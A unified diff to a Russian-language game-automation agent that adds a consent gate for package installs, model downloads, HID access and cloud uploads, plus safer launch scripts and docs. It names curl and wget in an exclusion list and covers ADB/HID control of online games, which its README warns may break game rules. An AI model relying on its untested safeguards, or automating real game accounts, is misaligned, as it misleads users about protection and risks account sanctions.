@@ -1,0 +1,843 @@
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/ARCHITECTURE.md /mnt/data/UniversalGameAgent_v4_PermissionGate/ARCHITECTURE.md
+--- /mnt/data/UniversalGameAgent_v4/ARCHITECTURE.md	2026-10-09 17:14:14.538786707 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/ARCHITECTURE.md	2026-10-09 17:19:32.911945053 +0000
+@@ -104,3 +104,42 @@
+ | HID курсор и координаты | Ошибочное касание | Калибровка или ADB fallback |
+ | Потеря HID ACK | Дублирование нажатия | Никогда не повторять неопределённый жест |
+ | Skill Registry без игры | DSL не умеет лечить | Только зарегистрированные навыки, иначе wait |
++
++---
++
++## Level 4.1 — PermissionGate (добавлено)
++
++```mermaid
++flowchart TD
++  START[main_l4.py -- только stdlib] --> P[PermissionGate + preflight]
++  P -->|пакет имеется| CORE[Импорт исходного L3]
++  P -->|пакета нет| ASK{Пауза и запрос Y/N}
++  ASK -->|Y - из белого списка| INSTALL[python -m pip install строго выбранный пакет]
++  ASK -->|N - обязательный| STOP[Остановка]
++  ASK -->|N - необязательный| FALL[Отключить слой; L3 fallback]
++  INSTALL --> CORE
++  FALL --> CORE
++  CORE --> VISION[Perception L3 + TemporalBrain + LocalVLM]
++  VISION --> SWARM[Commander/Scout/Logistic/Tactician]
++  SWARM --> DSL[DSLInterpreter -> SkillRegistry]
++  DSL --> SAFE[старый ActionExecutor -> ADB или одобренный HID]
++  SAFE --> MEM[Memory / ChromaDB / self_reflection]
++```
++
++### Запрет на непрошенные изменения
++
++- `security.py` — единственная точка запуска pip и подтверждаемой загрузки VLM-весов.
++- Доступ к HID Serial требует отдельного `Y`; облачная отправка кадров тоже требует отдельного `Y` и явного `--cloud`.
++- Скрипт запуска не содержит `pip install`, `ollama pull`, `curl`, `wget` и не изменяет реестр, драйверы или USB-настройки.
++- ADB проверяется, но никогда не устанавливается автоматически; подсказка содержит официальный URL Android Platform-Tools.
++- Нельзя передавать строку из VLM/DSL на выполнение в shell. Все команды собираются локальными адаптерами из проверяемых аргументов.
++- Отказ от обязательной зависимости останавливает запуск. Отказ от необязательной функции оставляет старую схему принятия решений и ADB.
++- Нужна отдельная песочница ОС/контейнер для *сильных* гарантий от недоверенного Python-кода: `PermissionGate` не перехватывает произвольные вызовы `subprocess` в сторонних расширениях.
++
++### Bottlenecks безопасности
++
++1. Человек может долго отвечать на запросы, и игра продолжит работать на телефоне. Перед запросом установка допускается только в момент старта; во время игры запросы должны останавливать исполнитель действий.
++2. Дополнительные пакеты скачивают транзитивные зависимости, которые должны быть проверены при высоких требованиях к безопасности; лучше использовать предварительно утверждённый, проверенный lockfile и виртуальное окружение.
++3. OCR без возможности загрузки весов может выключиться. Лучше поставлять предварительно проверенные веса офлайн или запрашивать отдельное согласие на скачивание.
++4. Cloud VLM требует согласия на передачу каждого типа чувствительных данных: скриншоты могут содержать имя аккаунта, личные сообщения или уведомления.
++5. Временной прогноз зависит от калибровки ROI и дискретизации; при шуме OCR — риск ложного предупреждения.
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/PATCH_PERMISSION_GATE.diff /mnt/data/UniversalGameAgent_v4_PermissionGate/PATCH_PERMISSION_GATE.diff
+--- /mnt/data/UniversalGameAgent_v4/PATCH_PERMISSION_GATE.diff	1970-01-01 00:00:00.000000000 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/PATCH_PERMISSION_GATE.diff	2026-10-09 17:20:07.117344009 +0000
+@@ -0,0 +1,46 @@
++diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/ARCHITECTURE.md /mnt/data/UniversalGameAgent_v4_PermissionGate/ARCHITECTURE.md
++--- /mnt/data/UniversalGameAgent_v4/ARCHITECTURE.md	2026-10-09 17:14:14.538786707 +0000
+++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/ARCHITECTURE.md	2026-10-09 17:19:32.911945053 +0000
++@@ -104,3 +104,42 @@
++ | HID курсор и координаты | Ошибочное касание | Калибровка или ADB fallback |
++ | Потеря HID ACK | Дублирование нажатия | Никогда не повторять неопределённый жест |
++ | Skill Registry без игры | DSL не умеет лечить | Только зарегистрированные навыки, иначе wait |
+++
+++---
+++
+++## Level 4.1 — PermissionGate (добавлено)
+++
+++```mermaid
+++flowchart TD
+++  START[main_l4.py -- только stdlib] --> P[PermissionGate + preflight]
+++  P -->|пакет имеется| CORE[Импорт исходного L3]
+++  P -->|пакета нет| ASK{Пауза и запрос Y/N}
+++  ASK -->|Y - из белого списка| INSTALL[python -m pip install строго выбранный пакет]
+++  ASK -->|N - обязательный| STOP[Остановка]
+++  ASK -->|N - необязательный| FALL[Отключить слой; L3 fallback]
+++  INSTALL --> CORE
+++  FALL --> CORE
+++  CORE --> VISION[Perception L3 + TemporalBrain + LocalVLM]
+++  VISION --> SWARM[Commander/Scout/Logistic/Tactician]
+++  SWARM --> DSL[DSLInterpreter -> SkillRegistry]
+++  DSL --> SAFE[старый ActionExecutor -> ADB или одобренный HID]
+++  SAFE --> MEM[Memory / ChromaDB / self_reflection]
+++```
+++
+++### Запрет на непрошенные изменения
+++
+++- `security.py` — единственная точка запуска pip и подтверждаемой загрузки VLM-весов.
+++- Доступ к HID Serial требует отдельного `Y`; облачная отправка кадров тоже требует отдельного `Y` и явного `--cloud`.
+++- Скрипт запуска не содержит `pip install`, `ollama pull`, `curl`, `wget` и не изменяет реестр, драйверы или USB-настройки.
+++- ADB проверяется, но никогда не устанавливается автоматически; подсказка содержит официальный URL Android Platform-Tools.
+++- Нельзя передавать строку из VLM/DSL на выполнение в shell. Все команды собираются локальными адаптерами из проверяемых аргументов.
+++- Отказ от обязательной зависимости останавливает запуск. Отказ от необязательной функции оставляет старую схему принятия решений и ADB.
+++- Нужна отдельная песочница ОС/контейнер для *сильных* гарантий от недоверенного Python-кода: `PermissionGate` не перехватывает произвольные вызовы `subprocess` в сторонних расширениях.
+++
+++### Bottlenecks безопасности
+++
+++1. Человек может долго отвечать на запросы, и игра продолжит работать на телефоне. Перед запросом установка допускается только в момент старта; во время игры запросы должны останавливать исполнитель действий.
+++2. Дополнительные пакеты скачивают транзитивные зависимости, которые должны быть проверены при высоких требованиях к безопасности; лучше использовать предварительно утверждённый, проверенный lockfile и виртуальное окружение.
+++3. OCR без возможности загрузки весов может выключиться. Лучше поставлять предварительно проверенные веса офлайн или запрашивать отдельное согласие на скачивание.
+++4. Cloud VLM требует согласия на передачу каждого типа чувствительных данных: скриншоты могут содержать имя аккаунта, личные сообщения или уведомления.
+++5. Временной прогноз зависит от калибровки ROI и дискретизации; при шуме OCR — риск ложного предупреждения.
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/README.md /mnt/data/UniversalGameAgent_v4_PermissionGate/README.md
+--- /mnt/data/UniversalGameAgent_v4/README.md	2026-10-09 17:14:14.742784872 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/README.md	2026-10-09 17:19:32.911945053 +0000
+@@ -1,55 +1,63 @@
+-# Universal Game Agent v4.0 (additive integration)
++# Universal Game Agent — Level 4 + PermissionGate
+ 
+-**Текущая версия — Python-код надстройки L4**, собранный на основе ранее созданного v2.0. Не готовый APK и не проверенный игрок для любой MMORPG.
++**Надстройка над L3 и ранее созданным L4, а не переписывание.** `main.py` и прежние `brain.py`, `action.py`, `memory.py`, `vlm.py` остаются доступными как fallback. Новая точка входа — `main_l4.py`. Система является исследовательским прототипом: она не гарантирует прохождения любой игры.
+ 
+-## Установка на Windows (из распакованного ZIP)
++## Главное изменение: никаких скрытых установок
+ 
+-1. Включите отладку USB на своём телефоне, подключите к ПК и разрешите ADB.
+-2. Python 3.10+, Android SDK Platform Tools (команда `adb devices`).
+-3. В директории проекта запустите:
++* Агент **не выполняет** установку Python-пакетов, `ollama pull`, подключение Serial HID или передачу изображения облачной VLM без **отдельного явно введённого `Y`**. `N`, пустой ввод, EOF означают отказ. Разрешение не сохраняется на будущие запуски.
++* Для каждого запроса показываются: название и точная операция, техническая причина, польза человеку, риски.
++* Для пакетов допускается только статический белый список; команды строятся списком аргументов, не с `shell=True`. `pip` может скачивать транзитивные зависимости — об этом предупреждаем.
++* При отказе от **обязательной** библиотеки запуск останавливается. От OCR, YOLO, ChromaDB, ONNX, HID или VLM — используется доступный L3/L4 fallback.
++* **ОС, драйверы, разрешения Android и исполняемые инсталляторы** никогда не меняются автоматически. Если нет ADB или Ollama, пользователь получает ручную инструкцию; даже согласие не запускает скачивание EXE.
++* EasyOCR создаётся с `download_enabled=False`, чтобы не скачивать веса при первом запуске. Если веса отсутствуют — нужен отдельный ручной этап или запуск без `--ocr`.
++* Надёжное ограничение стороннего кода возможно только в отдельной изолированной среде. `PermissionGate` охватывает пути запуска и управляемые обновлением действия, но не защищает от произвольно запущенных недоверенных Python-плагинов.
++* Старые одно-кликовые установщики из предыдущих архивов **не используют** этот протокол; пользуйтесь новым `START_L4_SAFE.cmd`.
+ 
+-```powershell
+-py -m pip install -r requirements.txt
+-# Опционально для OCR, YOLO и ChromaDB:
+-py -m pip install -r requirements-optional.txt
+-# Опционально для готового ONNX-экспорта / Pico USB UART:
+-py -m pip install -r requirements-l4-optional.txt
+-```
++## Первый запуск Windows
+ 
+-Для локальной VLM устанавливают Ollama и подходящую модель. Для Qwen2-VL-2B (сторонний quantized tag):
+-
+-```powershell
+-ollama pull aleSuglia/qwen2-vl-2b-instruct-q4_k_m
+-```
++1. Распакуйте **весь ZIP** (не запускайте скрипт внутри архива).
++2. На Samsung вручную включите USB-отладку и разрешите своему ПК подключение. Не запускайте тест на устройстве с личными данными без понимания прав ADB.
++3. Дважды нажмите `START_L4_SAFE.cmd`. Требуется уже установленный Python, чтобы запустить запрос разрешения. Если ADB не установлен, агент покажет инструкцию, но **не будет загружать или ставить его**.
++4. Можно проверить только зависимости без телефона: `py main_l4.py --preflight-only`.
++5. Проверка без нажатий: `py main_l4.py --max-steps 5`.
++6. Включайте реальные действия только после верификации: `py main_l4.py --execute --max-steps 20`.
+ 
+-Если модель/тег недоступны, `LocalVLM(model="qwen2.5vl:3b")` можно указать в `main_l4.py`; L3 модель через исходный `main.py` работает независимо. Скачивание локальной VLM требует интернета и места на диске, инференс — ресурсов ПК.
++По умолчанию: никакого ввода в игру (`dry_run`), никакой передачи кадров в облако. Веса локальной VLM `qwen2.5vl:3b` скачиваются **только при подтверждении `Y`**, если пользователь уже установил Ollama, модель отсутствует и интернет доступен. Если Ollama не установлена, программа выведет инструкцию и продолжит без неё.
+ 
+-## Безопасный старт (без нажатий)
+-
+-```powershell
+-adb devices
+-py main_l4.py --game test1 --max-steps 5
+-```
+-
+-По умолчанию L4 = **DRY RUN**, облачная отправка отключена. Нажатия включаются только явным `--execute`, когда проверены координаты и навыки:
+-
+-```powershell
+-py main_l4.py --game test1 --ocr --chroma --execute --max-steps 20
+-```
+-
+-Чтобы использовать CV для полос, задайте нормализованный прямоугольник (это **не универсальные координаты**):
++### Дополнительные функции
+ 
+ ```powershell
++py main_l4.py --ocr --chroma --max-steps 5
+ py main_l4.py --hp-roi 0.03,0.04,0.30,0.07 --max-steps 5
++py main_l4.py --cloud --max-steps 5
+ ```
+ 
+-Для облачной VLM требуется осознанное разрешение `--cloud` и переменная окружения `VLM_API_KEY`; кадры будут передаваться внешнему провайдеру.
+-
+-## Важное для настоящего Level 3
++`--cloud` **не означает автоматическую передачу**: на каждый запуск требуется отдельное подтверждение, а также ключ `VLM_API_KEY`. **Совет:** для первых тестов не включайте cloud/HID и не включайте `--execute`.
+ 
+-Мы сохранили всю исходную v2.0: `py main.py` работает как раньше. Прямо в главном цикле добавлены только **две точки расширения**, и текст индексации памяти дополняется состояниями L4. Новый запуск через `py main_l4.py` включает L4.
++## Модули
+ 
+-Наша доступная исходная v2.0 не содержала Voyager Skill Library, поэтому **конкретные навыки не изобретены**: подключите действующую библиотеку через `SkillRegistry.register` и верните объекты `Action` с подтверждёнными bounding-box. Пока навык не зарегистрирован, агент ничего не нажимает по соответствующему DSL-правилу.
++| Компонент | Код | Статус |
++|---|---|---|
++| Perception L3 | `game_agent/perception.py` | Сохранён; отключена скрытая загрузка OCR-весов |
++| Manager/Worker | `game_agent/brain.py` | Сохранён как fallback |
++| Action + ADB | `game_agent/action.py`, `adb.py` | Сохранены |
++| Memory / ChromaDB | `game_agent/memory.py` | Сохранена история эпизодов |
++| TemporalBrain | `game_agent/l4/temporal.py` | Прогноз по 10 состояниям; cooldowns — 0,5 c |
++| Local / cloud VLM | `game_agent/l4/local_vlm.py` | Локальная первая; облако только с Y и при confidence <0.7 |
++| SwarmBus | `game_agent/l4/swarm.py` | Commander, Tactician, Logistic, Scout |
++| DSLInterpreter | `game_agent/l4/dsl.py` | Строгий AST и зарегистрированные навыки |
++| Skill adapter | `game_agent/l4/skill_adapter.py` | Совместимость с внешней Skill Library |
++| HID | `game_agent/l4/hid.py` | Дополнительный транспорт, без заявлений об обходе защит |
++| **PermissionGate** | `game_agent/l4/security.py` | **НОВЫЙ:** разрешение на каждое изменение |
++| **Bootstrap** | `game_agent/l4/bootstrap.py` | **НОВЫЙ:** проверки до импортов сторонних библиотек |
++
++## Ограничения и ресурсы
++
++- YOLO без обученных весов для интерфейса игры не распознаёт произвольные игровые кнопки. OCR требует локальные веса; ChromaDB использует локальные лексические embeddings без сетевой загрузки моделей.
++- LSTM не обучалась: TemporalPredictor — прогноз по регрессии скользящего окна. Число 0,5 секунды задаёт горизонт, **не гарантирует частоту 2 кадра/с**.
++- `LocalVLM` поддерживает backend `OnnxRuntimeAdapter` для **готового полного ONNX-пайплайна**; архив не содержит Qwen2-VL-2B ONNX-весов и не притворяется, что один encoder запускает мультимодальную генерацию. Локальная модель Ollama по умолчанию — `qwen2.5vl:3b`.
++- Оценка confidence VLM может быть некалиброванной; качество следует проверять на игровых датасетах.
++- HID — только для разрешённых сценариев ввода. Это не обход античита, и любая автоматизация может нарушать правила онлайн-игры.
+ 
+ ## Проверка
+ 
+@@ -57,6 +65,4 @@
+ py -m pytest -q tests
+ ```
+ 
+-На момент упаковки: 30 автотестов успешно пройдены на Python, без физического телефона, API, готовых Qwen2-VL ONNX-весов или Raspberry Pi Pico. Перед продуктивным использованием нужны end-to-end тесты со скриншотами конкретной игры.
+-
+-См. [ARCHITECTURE.md](ARCHITECTURE.md) для полного плана дистилляции, протокола HID, структуры модулей и ограничений.
++Тесты используют заглушки; физический Samsung, настоящий HID, веса YOLO и облачные API не проверялись. Подробная диаграмма и дистилляция — `ARCHITECTURE.md`.
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/START_L4_SAFE.cmd /mnt/data/UniversalGameAgent_v4_PermissionGate/START_L4_SAFE.cmd
+--- /mnt/data/UniversalGameAgent_v4/START_L4_SAFE.cmd	2026-10-09 17:10:38.204436753 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/START_L4_SAFE.cmd	2026-10-09 17:19:32.808201495 +0000
+@@ -1,10 +1,12 @@
+ @echo off
+ chcp 65001 >nul
+ cd /d "%~dp0"
+-echo Universal Game Agent v4 - SAFE TEST
+-where py >nul 2>nul || (echo Python launcher py не найден. Установите Python и повторите. & pause & exit /b 1)
+-where adb >nul 2>nul || (echo ADB не найден в PATH. Установите platform-tools. & pause & exit /b 1)
+-adb devices
+-py main_l4.py --max-steps 5
+-if errorlevel 1 echo Ошибка запуска. Прочитайте README.md
++echo ========================================
++echo Universal Game Agent Level 4 - SAFE
++echo No automatic installations or downloads.
++echo All changes require explicit Y/N.
++echo ========================================
++where py >nul 2>nul || (echo Python is missing. Install Python manually from https://www.python.org/downloads/ . & pause & exit /b 1)
++py main_l4.py --game generic --max-steps 5
++if errorlevel 1 echo Check the error message above.
+ pause
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/game_agent/l4/bootstrap.py /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/l4/bootstrap.py
+--- /mnt/data/UniversalGameAgent_v4/game_agent/l4/bootstrap.py	1970-01-01 00:00:00.000000000 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/l4/bootstrap.py	2026-10-09 17:16:19.938396974 +0000
+@@ -0,0 +1,40 @@
++"""Проверка зависимостей ДО импорта cv2/numpy и остальных пакетов игры."""
++from __future__ import annotations
++import shutil
++from .security import PermissionGate, PermissionDenied, Risk
++
++
++def preflight(gate: PermissionGate, *, ocr=False, yolo=False, chroma=False,
++              onnx=False, hid=False) -> dict[str, bool]:
++    """Обязательные зависимости требуют разрешённой установки или остановки.
++
++    Optional-слои при отказе отключаются без нарушения работы ядра.
++    """
++    for name in ("numpy", "cv2", "PIL", "requests"):
++        gate.ensure_dependency(name, required=True)
++
++    result = {}
++    for enabled, module, name in (
++        (ocr, "easyocr", "ocr"),
++        (yolo, "ultralytics", "yolo"),
++        (chroma, "chromadb", "chroma"),
++        (onnx, "onnxruntime", "onnx"),
++        (hid, "serial", "hid"),
++    ):
++        result[name] = gate.ensure_dependency(module, required=False) if enabled else False
++    return result
++
++
++def check_adb(gate: PermissionGate, adb_path="adb") -> bool:
++    if shutil.which(adb_path):
++        return True
++    gate.require_external_action(
++        title="Установить Android SDK Platform-Tools вручную",
++        exact_action="Открыть https://developer.android.com/tools/releases/platform-tools и установить ADB самостоятельно",
++        technical_reason="команда adb не найдена; нельзя получить кадр и управлять телефоном",
++        user_benefit="безопасное подключение Android через официальный инструмент",
++        risks="USB-отладка предоставляет авторизованному ПК расширенный доступ к устройству; выключайте после теста",
++        risk=Risk.HIGH,
++    )
++    # ОС агент НЕ изменяет — пользователь устанавливает инструменты самостоятельно.
++    return False
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/game_agent/l4/local_vlm.py /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/l4/local_vlm.py
+--- /mnt/data/UniversalGameAgent_v4/game_agent/l4/local_vlm.py	2026-10-09 17:07:41.836246042 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/l4/local_vlm.py	2026-10-09 17:17:35.714837059 +0000
+@@ -49,7 +49,7 @@
+ 
+     Поддерживается инъекция OnnxRuntimeAdapter для готового экспорта.
+     """
+-    def __init__(self, backend=None, model="aleSuglia/qwen2-vl-2b-instruct-q4_k_m",
++    def __init__(self, backend=None, model="qwen2.5vl:3b",
+                  url="http://127.0.0.1:11434/api/chat"):
+         self.backend = backend or VLM("ollama", model, url, "", "")
+ 
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/game_agent/l4/security.py /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/l4/security.py
+--- /mnt/data/UniversalGameAgent_v4/game_agent/l4/security.py	1970-01-01 00:00:00.000000000 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/l4/security.py	2026-10-09 17:19:32.808063132 +0000
+@@ -0,0 +1,171 @@
++"""Явное одноразовое разрешение для действий, изменяющих окружение.
++
++Без `Y` не выполняются ни pip install, ни скачивание весов, ни HID-подключение.
++Этот модуль НЕ является изоляцией недоверенных Python-плагинов; плагины
++исполняются в том же процессе и должны предварительно проверяться человеком.
++"""
++from __future__ import annotations
++
++from dataclasses import dataclass
++from enum import Enum
++import importlib.util
++import re
++import subprocess
++import sys
++from typing import Callable
++
++
++class PermissionDenied(RuntimeError):
++    """Пользователь отказал или консоль недоступна."""
++
++
++class SetupFailed(RuntimeError):
++    """Одобренная операция завершилась с ошибкой."""
++
++
++class Risk(str, Enum):
++    LOW = "низкий"
++    MEDIUM = "средний"
++    HIGH = "высокий"
++
++
++@dataclass(frozen=True)
++class PermissionRequest:
++    title: str
++    exact_action: str
++    technical_reason: str
++    user_benefit: str
++    risks: str
++    risk: Risk = Risk.MEDIUM
++
++
++@dataclass(frozen=True)
++class Dependency:
++    module: str
++    requirement: str
++    purpose: str
++    benefit: str
++    risks: str
++
++
++# Белый список создаёт разработчик, но НЕ модель/VLM и НЕ пользовательский DSL.
++# pip может загрузить транзитивные зависимости: это сообщается до согласия.
++DEPENDENCIES: dict[str, Dependency] = {
++    "numpy": Dependency("numpy", "numpy>=1.26,<3", "численные векторы и прогноз", "возможность строить прогноз HP/MP", "загрузка пакета и его зависимостей; место на диске"),
++    "cv2": Dependency("cv2", "opencv-python>=4.8,<5", "обработка изображений экрана", "локальное распознавание интерфейса", "установка бинарной библиотеки, использование диска"),
++    "PIL": Dependency("PIL", "Pillow>=10,<13", "чтение и изменение изображений", "подготовка скриншотов для анализа", "загрузка стороннего пакета и зависимостей"),
++    "requests": Dependency("requests", "requests>=2.31,<3", "HTTP-вызов настроенного сервера VLM", "доступ к локальной либо выбранной облачной модели", "сетевая передача при явном обращении к API"),
++    "easyocr": Dependency("easyocr", "easyocr>=1.7,<2", "распознавание текста интерфейса", "чтение заданий и меню", "большие зависимости; OCR может дополнительно скачать веса при первом запуске"),
++    "ultralytics": Dependency("ultralytics", "ultralytics>=8.2,<9", "детекция объектов обученной моделью YOLO", "быстрое распознавание известных элементов", "дополнительные зависимости и нагрузка на GPU"),
++    "chromadb": Dependency("chromadb", "chromadb>=1,<2", "сохранение семантической памяти", "поиск похожих предыдущих игровых ситуаций", "дисковое хранилище; зависимости могут быть объёмными"),
++    "onnxruntime": Dependency("onnxruntime", "onnxruntime>=1.18,<2", "инференс подготовленной ONNX-модели", "локальные предсказания без облачного API", "нагрузка CPU/GPU; внешняя модель требует отдельной проверки"),
++    "serial": Dependency("serial", "pyserial>=3.5,<4", "Serial-связь с тестовым HID-устройством", "альтернативное управление на совместимом стенде", "доступ к аппаратному порту; неверная калибровка приводит к неправильному вводу"),
++}
++
++
++class PermissionGate:
++    """Показывает четыре обязательных пункта и принимает ТОЛЬКО явное Y.
++
++    Каждое разрешение одноразовое; при ошибках или EOF выбор — N.
++    Важно: системные настройки и установку EXE мы никогда не меняем автоматически.
++    """
++    def __init__(self, ask: Callable[[str], str] = input,
++                 output: Callable[[str], object] = print,
++                 runner: Callable = subprocess.run):
++        self.ask, self.output, self.runner = ask, output, runner
++
++    def approve(self, request: PermissionRequest) -> bool:
++        self.output("\n" + "=" * 60)
++        self.output("ОФИЦИАЛЬНЫЙ ЗАПРОС РАЗРЕШЕНИЯ — Universal Game Agent")
++        self.output(f"Действие: {request.title}")
++        self.output(f"Точная операция: {request.exact_action}")
++        self.output(f"Техническая причина: {request.technical_reason}")
++        self.output(f"Польза: {request.user_benefit}")
++        self.output(f"Риски: {request.risks}")
++        self.output(f"Уровень риска: {request.risk.value}")
++        self.output("Без подтверждения действие НЕ выполнится. Y — разрешить ОДИН раз, N — отказаться.")
++        try:
++            answer = self.ask("Подтвердить действие? [Y/N]: ")
++        except (KeyboardInterrupt, EOFError, OSError):
++            answer = "N"
++        allowed = isinstance(answer, str) and answer.strip().upper() == "Y"
++        self.output("Разрешено пользователем" if allowed else "ОТКЛОНЕНО: действие не выполнено")
++        return allowed
++
++    @staticmethod
++    def available(module: str) -> bool:
++        try:
++            return importlib.util.find_spec(module) is not None
++        except (ImportError, ValueError, ModuleNotFoundError):
++            return False
++
++    def ensure_dependency(self, module: str, *, required: bool = False) -> bool:
++        """При отсутствии — PAUSE + Y/N; затем только заранее заданный pip аргумент.
++
++        Если отказано: возвращаем False для optional и PermissionDenied для required.
++        Никакие команды из результатов VLM не принимаются.
++        """
++        if self.available(module):
++            return True
++        if module not in DEPENDENCIES:
++            raise ValueError(f"Зависимость {module!r} не зарегистрирована в политике безопасности")
++        dep = DEPENDENCIES[module]
++        cmd = [sys.executable, "-m", "pip", "install", "--disable-pip-version-check", "--no-input", dep.requirement]
++        request = PermissionRequest(
++            title=f"Установить Python-пакет {dep.requirement}",
++            exact_action=" ".join(cmd),
++            technical_reason=dep.purpose + "; модуль отсутствует в текущем Python",
++            user_benefit=dep.benefit,
++            risks=dep.risks + "; pip также может скачать транзитивные зависимости",
++            risk=Risk.MEDIUM,
++        )
++        if not self.approve(request):
++            if required:
++                raise PermissionDenied(f"Обязательная зависимость {dep.requirement} не установлена")
++            return False
++        try:
++            result = self.runner(cmd, check=False, timeout=600)
++        except (OSError, subprocess.TimeoutExpired) as exc:
++            raise SetupFailed(f"Установка {dep.requirement} завершилась с ошибкой") from exc
++        if result.returncode != 0:
++            raise SetupFailed(f"pip вернул код {result.returncode} для {dep.requirement}")
++        if not self.available(module):
++            raise SetupFailed(f"Пакет {dep.requirement} установлен, но его импорт не обнаружен")
++        return True
++
++    def require_external_action(self, *, title: str, exact_action: str,
++                                technical_reason: str, user_benefit: str,
++                                risks: str, risk: Risk = Risk.MEDIUM) -> bool:
++        """Для Serial/HID, облачной передачи, модели или ручной системной настройки.
++
++        Метод только спрашивает. Исполнитель должен дополнительно проверить `True`.
++        """
++        return self.approve(PermissionRequest(title, exact_action,
++                                              technical_reason, user_benefit,
++                                              risks, risk))
++
++    def ensure_ollama_model(self, model: str, *, available_models: set[str],
++                            ollama_path: str = "ollama") -> bool:
++        """Загрузка возможна только для вручную разрешённых имён и после Y.
++
++        Метод не вызывается автоматически при старте; разработчик определяет,
++        какую модель просить. Не исполнять имена, полученные от VLM.
++        """
++        approved = {"qwen2.5vl:3b"}
++        if model in available_models:
++            return True
++        if model not in approved:
++            raise ValueError("Модель не входит в белый список: нужен аудит источника")
++        if not self.require_external_action(
++            title="Загрузить локальную модель VLM",
++            exact_action=f"{ollama_path} pull {model}",
++            technical_reason="локальные веса не обнаружены; без них VLM не сможет анализировать изображения",
++            user_benefit="можно анализировать кадры без отправки их в облако",
++            risks="сетевая загрузка нескольких ГБ; место на диске и возможные условия лицензии модели",
++            risk=Risk.MEDIUM,
++        ):
++            return False
++        result = self.runner([ollama_path, "pull", model], check=False, timeout=3600)
++        if result.returncode != 0:
++            raise SetupFailed(f"Не удалось скачать модель {model}")
++        return True
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/game_agent/l4/temporal.py /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/l4/temporal.py
+--- /mnt/data/UniversalGameAgent_v4/game_agent/l4/temporal.py	2026-10-09 17:08:29.533715106 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/l4/temporal.py	2026-10-09 17:19:32.808170058 +0000
+@@ -33,11 +33,13 @@
+     threat: float | None
+     events: tuple[str, ...]
+     confidence: float
++    cooldowns: dict[str, float] = field(default_factory=dict)
+ 
+     def as_dict(self) -> dict:
+         return {"horizon": self.horizon, "hp": self.hp, "mp": self.mp,
+                 "distance": self.distance, "threat": self.threat,
+-                "events": list(self.events), "confidence": self.confidence}
++                "events": list(self.events), "confidence": self.confidence,
++                "cooldowns": self.cooldowns}
+ 
+ 
+ class GameStateExtractor:
+@@ -153,4 +155,7 @@
+                 events.append("enemy_approaching")
+         if threat is not None and threat > .8 and tc >= .3:
+             events.append("possible_attack")
+-        return Prediction(self.horizon, hp, mp, distance, threat, tuple(events), round(confidence, 3))
++        cds = {name: max(0.0, secs - self.horizon)
++               for name, secs in (current.cooldowns.items() if current else ())}
++        return Prediction(self.horizon, hp, mp, distance, threat, tuple(events),
++                          round(confidence, 3), cds)
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/game_agent/perception.py /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/perception.py
+--- /mnt/data/UniversalGameAgent_v4/game_agent/perception.py	2026-10-09 16:32:19.591575915 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/game_agent/perception.py	2026-10-09 17:17:35.714692479 +0000
+@@ -28,7 +28,10 @@
+         if enable_ocr:
+             try:
+                 import easyocr
+-                self.reader = easyocr.Reader(["ru", "en"], gpu=False)
++                # Без явного Y не разрешаем EasyOCR скачивать веса при старте.
++                self.reader = easyocr.Reader(["ru", "en"], gpu=False, download_enabled=False)
++            except FileNotFoundError as exc:
++                raise RuntimeError("OCR-веса отсутствуют. Нужна ручная установка после согласования; продолжите без --ocr") from exc
+             except ImportError as exc:
+                 raise RuntimeError("Установите pip install easyocr или выключите --ocr") from exc
+         if enable_yolo:
+diff -ruN '--exclude=__pycache__' '--exclude=.pytest_cache' '--exclude=*.pyc' /mnt/data/UniversalGameAgent_v4/main_l4.py /mnt/data/UniversalGameAgent_v4_PermissionGate/main_l4.py
+--- /mnt/data/UniversalGameAgent_v4/main_l4.py	2026-10-09 17:07:41.950706343 +0000
++++ /mnt/data/UniversalGameAgent_v4_PermissionGate/main_l4.py	2026-10-09 17:19:32.807900013 +0000
+@@ -1,26 +1,87 @@
+-"""Запуск уровня 4. Оригинальный main.py не изменён."""
++"""Level 4 с PermissionGate: stdlib preflight до импорта сторонних библиотек.
++
++НИКОГДА не устанавливает пакеты или скачивает модель до явного ответа Y.
++Оригинальный main.py остаётся без изменений.
++"""
++from __future__ import annotations
+ import argparse
++import json
+ import logging
+ import os
+-from game_agent.config import Settings
+-from game_agent.vlm import VLM
+-from game_agent.l4.agent_l4 import Level4Agent
++import shutil
++import subprocess
++
++from game_agent.l4.security import PermissionGate, PermissionDenied, Risk, SetupFailed
++from game_agent.l4.bootstrap import check_adb, preflight
+ 
+ 
+ def roi(text):
